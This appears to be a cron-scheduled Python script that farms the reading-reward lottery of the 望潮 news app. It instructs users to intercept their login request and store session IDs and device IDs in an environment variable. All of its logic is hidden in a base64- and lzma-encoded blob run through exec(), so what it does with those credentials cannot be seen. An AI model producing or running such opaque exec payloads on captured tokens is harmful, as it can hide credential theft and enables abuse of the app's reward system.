'''
cron: 30 11 * * *
new Env('望潮阅读抽奖');
问题反馈联系请联系：https://t.me/bwersgt
群组：https://t.me/yangmaoxz
频道地址：https://t.me/ymxzpd

使用方法：
1.打开app，点击阅读有礼
2.抓包https://xmt.taizhou.com.cn/prod-api/user-read/app/login接口的id,sessionId,deviceId参数
3.配置文件添加
单账户：export wcread="[ {'name': 'xxx','aid': 'id', 'sid': 'sessionId', 'deviceId':'deviceId'}]"
多账户：export wcread="[
{'name': 'xxx','aid': 'xxxx', 'sid': 'xxxx', 'deviceId':'xxxx'},
{'name': 'xxx','aid': 'xxxx', 'sid': 'xxxx', 'deviceId':'xxxx'}
]"
参数说明：
bz:备注名随意填写
aid:2步骤中的id参数
sid:2步骤中的sessionId参数
deviceId:2步骤中的deviceId参数
'''

import lzma,base64
DuvdsGnLFeHjXIhaWCPNozUgBTMiptOVElJRkYqwfAcQmSxbKy=base64.b64decode
DuvdsGnLFeHjXIhaWCPNozUgBTMiptOVElJRkYqwfAcQmSxbKr=lzma.decompress
exec(DuvdsGnLFeHjXIhaWCPNozUgBTMiptOVElJRkYqwfAcQmSxbKr(DuvdsGnLFeHjXIhaWCPNozUgBTMiptOVElJRkYqwfAcQmSxbKy('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')))
